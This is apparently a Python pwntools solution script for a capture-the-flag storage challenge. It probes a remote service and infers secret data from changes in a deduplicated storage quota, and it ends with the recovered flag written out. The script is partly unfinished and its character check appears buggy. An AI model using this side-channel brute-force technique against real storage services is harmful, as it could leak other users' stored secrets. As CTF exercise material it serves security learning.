from pwn import *
import re
import string
import itertools

def filteredResponse(word):
	r = remote('filestore.2021.ctfcompetition.com',1337)
	print(f"Trying {word}")
	r.send("store\r\n")
	r.recvuntil('exit')
	r.send(f"{word}\r\n")
	r.recvuntil('exit')
	
	r.send('status\r\n')
	resp = r.recvuntil('Menu').decode()
	
	filtered_resp = re.search(r'Quota: (.+)/64.000kB', resp)
	r.close()
	return filtered_resp[1]



quota = filteredResponse('')
#We want to check if the occurrence has increased or not
#So we do up a brute force attack where we constantly search up 
print(f"[+] Quota : {quota}")
result = []
valid = []

#Get a list of possible chars first!
for char in string.ascii_uppercase + string.ascii_lowercase+string.digits + '{}_':
	
	filtered_resp = filteredResponse(char)
	if(filtered_resp[1] == quota):
		valid.append(char)
		print(f"\n{char} works! Adding to list...\n")
		print(f"Flag so far : {result}")


#Create permutations of various characters using itertools
#List of size of valid characters
valid_n_chars = {1: valid}






flag = "CTF{CR1M3_0f_d3dup1ic4ti0n}"